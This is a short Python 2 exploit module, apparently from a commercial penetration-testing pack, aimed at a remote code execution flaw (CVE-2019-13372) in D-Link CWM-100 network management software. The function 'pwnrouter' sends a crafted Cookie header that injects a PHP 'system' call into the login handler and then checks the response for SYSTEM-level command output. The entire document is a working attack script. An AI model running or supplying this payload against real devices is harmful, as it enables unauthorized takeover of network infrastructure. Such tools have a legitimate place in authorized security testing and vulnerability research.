#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_dlink_35'
_vendor_ = 'dlink'
_model_  = ['CWM-100']
_vuln_   = 'Remote Code Execution Vulnerability'
_cve_    = 'CVE-2019-13372'
_ref_    = 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/'
_port_   = 443

def pwnrouter(host,port=_port_):
  try:
    url = "https://%s:%s/index.php/Index/index" % (host,port)
    headers = {'Cookie': 'username=\',0,"",1,"0")%3bsystem(\'whoami\')%3b//";password='}
    response = requests.get(url, verify=False, headers=headers)
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if "nt authority\system" in response.text:
    print '[+] %s vulnerable' % host
    print response.text  


if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
